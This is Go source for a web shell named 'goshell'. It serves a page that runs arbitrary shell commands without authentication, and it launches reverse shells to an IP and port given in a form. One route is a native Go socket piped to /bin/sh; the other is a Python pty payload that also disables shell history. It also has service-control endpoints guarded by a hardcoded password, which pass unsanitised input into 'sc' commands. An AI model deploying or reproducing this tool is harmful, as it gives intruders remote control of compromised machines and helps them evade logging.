package main

import (
	"flag"
	"fmt"
	"html/template"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
)

type PageVariables struct {
	Cmd      string
	Services []string
}

const supersecret = "7monkeys"
const page = `<!DOCTYPE html>
<html>
<head>
<title>goshell</title>

<link rel="stylesheet" href="/css/main.css">
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
<script type="text/javascript">      

        $(document).ready(function() {        
      
            $('#restartwinservice').click(function(){
                $('#mainform').get(0).setAttribute('action', '/restartservice');
                    
                    $('#mainform').get(0).submit();
                
                
            });   

            $('#stopwinservice').click(function(){
                $('#mainform').get(0).setAttribute('action', '/stopservice');
                    
                    $('#mainform').get(0).submit();
                
                
            });  

            $('#startwinservice').click(function(){
                $('#mainform').get(0).setAttribute('action', '/startservice');
                    
                    $('#mainform').get(0).submit();
                
                
            });  
        });
</script>
</head>
<body bgcolor="#1a1a1a">
<div id="login">
<b>Reverse Shell</b>
<form action="/" method="POST">
IP: <input type="text" name="ip" value="localhost"/>
Port: <input type="text" name="port" value="4443"/>
<select name="ver">
  <option value="go">Go</option>
  <option value="py">py pty</option>
</select>
<input type="submit" class="multi" value="run">
</form>
</div>
<br>
<div id="login">
<textarea style="width:800px; height:400px;">{{.Cmd}}</textarea>
<br>
<form action="/" method="POST">
<input type="text" name="cmd" style="width: 690px" autofocus>
<input type="submit"  class="single" value="run">

</form>
</div>
<br>
<div id="login">
<br>



<form id="mainform" action="/" method="POST">     
        <select id="serviceSelect" name="serviceName"> // for loop in html template example
        {{with $1:=.Services}}
            {{range $1}}
                <option value="{{ . }}">{{ . }}</option>
            {{end}}
        {{end}}
        </select>
    <input type="submit" class="single" id="restartwinservice" value="Restart">
    <input type="submit" class="single" id="stopwinservice" value="Stop">
    <input type="submit" class="multi" id="startwinservice" value="Start"></p>
    <input type="text" name="password" style="width: 690px" autofocus>                
</form>
</div>
</body>
</html>
`

func reverseShell(ip string, port string) {
	c, _ := net.Dial("tcp", ip+":"+port)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func runCmd(cmd string) string {
	if runtime.GOOS == "windows" {
		sh := "cmd.exe"
		out, err := exec.Command(sh, "/K", cmd).Output()
		if err != nil {
			return fmt.Sprintf("Error: %s", err)
		}
		return string(out)
	}
	sh := "sh"
	out, err := exec.Command(sh, "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err)
	}
	return string(out)
}

func handler(w http.ResponseWriter, r *http.Request) {

	out := ""
	if r.Method == "POST" {
		r.ParseForm()
		if len(r.Form["ip"]) > 0 && len(r.Form["port"]) > 0 {
			ip := strings.Join(r.Form["ip"], " ")
			port := strings.Join(r.Form["port"], " ")
			ver := strings.Join(r.Form["ver"], " ")
			if runtime.GOOS != "windows" {
				if ver == "py" {
					payload := "python -c 'import os, pty, socket; h = \"" + ip + "\"; p = " + port + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'"
					go runCmd(payload)
				} else {
					go reverseShell(ip, port)
				}
				out = "Reverse shell launched to " + ip + ":" + port
			} else {
				out = "No reverse shell on windows yet."
			}

		}
		if len(r.Form["cmd"]) > 0 {
			cmd := strings.Join(r.Form["cmd"], " ")
			out = "$ " + cmd + "\n" + runCmd(cmd)
		}
	}

	returnResponse(w, out)
}

func restartservices(w http.ResponseWriter, r *http.Request) {

	out := ""

	if r.Method == "POST" {
		r.ParseForm()
		if len(r.Form["serviceName"]) > 0 && len(r.Form["password"]) > 0 {
			password := strings.Join(r.Form["password"], "")
			if password == supersecret {

				name := strings.Join(r.Form["serviceName"], " ")

				if runtime.GOOS == "windows" {
					out += "Stopping service " + name
					out += runCmd("sc stop " + name)
					out += "Starting service " + name
					out += runCmd("sc start " + name)
					println("restarting windows service ", name)
				}
			}

		}

	}

	returnResponse(w, out)
}

func stopservices(w http.ResponseWriter, r *http.Request) {

	out := ""

	if r.Method == "POST" {
		r.ParseForm()
		if len(r.Form["serviceName"]) > 0 && len(r.Form["password"]) > 0 {
			password := strings.Join(r.Form["password"], "")
			if password == supersecret {
				name := strings.Join(r.Form["serviceName"], " ")

				if runtime.GOOS == "windows" {
					out += "Stopping service " + name
					out += runCmd("sc stop " + name)
				}
			}

		}

	}

	returnResponse(w, out)
}

func startservices(w http.ResponseWriter, r *http.Request) {

	out := ""

	if r.Method == "POST" {
		r.ParseForm()
		if len(r.Form["serviceName"]) > 0 && len(r.Form["password"]) > 0 {
			password := strings.Join(r.Form["password"], "")
			if password == supersecret {
				name := strings.Join(r.Form["serviceName"], " ")

				if runtime.GOOS == "windows" {
					out += "Starting service " + name
					out += runCmd("sc start " + name)
				}
			}

		}
	}

	returnResponse(w, out)
}

func returnResponse(w http.ResponseWriter, out string) {
	services := runCmd("sc query state= all")
	//println(services)
	var ntServices []string
	for _, s := range strings.Split(strings.TrimSpace(string(services)), "\n") {
		serviceName := strings.Split(strings.TrimSpace(s), ":")
		if strings.Contains(serviceName[0], "SERVICE_NAME") {
			ntServices = append(ntServices, serviceName[1])
			println("SERVICE_NAME:", serviceName[1])
		}

	}

	MyPageVariables := PageVariables{
		Cmd:      out,
		Services: ntServices,
	}

	t := template.New("page")
	t, _ = t.Parse(page)
	t.Execute(w, MyPageVariables)
}

func main() {
	var ip, port string
	flag.StringVar(&ip, "ip", "", "IP")
	flag.StringVar(&port, "port", "8980", "Port")
	flag.Parse()
	//	fs := http.FileServer(http.Dir("./static/css"))
	http.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("./static/css"))))

	http.HandleFunc("/", handler)
	http.HandleFunc("/restartservice", restartservices)
	http.HandleFunc("/stopservice", stopservices)
	http.HandleFunc("/startservice", startservices)

	http.ListenAndServe(ip+":"+port, nil)
}
